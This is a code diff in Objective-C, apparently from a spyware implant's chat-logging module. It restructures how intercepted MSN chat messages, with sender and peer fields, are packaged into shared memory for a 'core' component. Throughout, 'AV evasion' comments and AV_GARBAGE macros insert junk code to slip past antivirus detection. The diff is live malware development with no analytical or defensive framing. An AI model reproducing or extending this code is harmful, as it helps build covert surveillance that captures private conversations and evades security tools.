@@ -44,7 +44,7 @@ void logMessage(NSString *message)
   // AV evasion: only on release build
   AV_GARBAGE_001
   
-  NSData *processName = [@"Microsoft Messenger" dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
+  //NSData *processName = [@"Microsoft Messenger" dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
   
   // AV evasion: only on release build
   AV_GARBAGE_005
@@ -260,19 +260,37 @@ void logMessage(NSString *message)
       AV_GARBAGE_004
     }
   
+  int programType = 0x07; // msn
+  int flags = 0x01; //chat incoming
+  
+  // Program type
+  [entryData appendBytes:&programType length:sizeof(programType)];
+
+  // flags 
+  [entryData appendBytes:&flags length:sizeof(flags)];
+  
   // Process Name
-  [entryData appendData: processName];
+  //[entryData appendData: processName];
   
   // AV evasion: only on release build
-  AV_GARBAGE_002
+  //AV_GARBAGE_002
   
-  [entryData appendBytes: &unicodeNullTerminator
-                  length: sizeof(short)];
+  //[entryData appendBytes: &unicodeNullTerminator
+  //                length: sizeof(short)];
   
   // AV evasion: only on release build
   AV_GARBAGE_001
   
-  // Topic
+  // From
+  [entryData appendData: topic];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
+  [entryData appendBytes: &unicodeNullTerminator
+                  length: sizeof(short)];
+  
+  // From_display
   [entryData appendData: topic];
   
   // AV evasion: only on release build
@@ -285,6 +303,15 @@ void logMessage(NSString *message)
   AV_GARBAGE_009
   
   // Peers
+  [entryData appendData: peers];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_008
+  
+  [entryData appendBytes: &unicodeNullTerminator
+                  length: sizeof(short)];
+  
+  // Peers_display
   [entryData appendData: peers];
   
   // AV evasion: only on release build
@@ -326,7 +353,7 @@ void logMessage(NSString *message)
   // AV evasion: only on release build
   AV_GARBAGE_009
   
-  shMemoryHeader->agentID         = AGENT_CHAT;
+  shMemoryHeader->agentID         = AGENT_CHAT_NEW;
   shMemoryHeader->direction       = D_TO_CORE;
   
   // AV evasion: only on release build
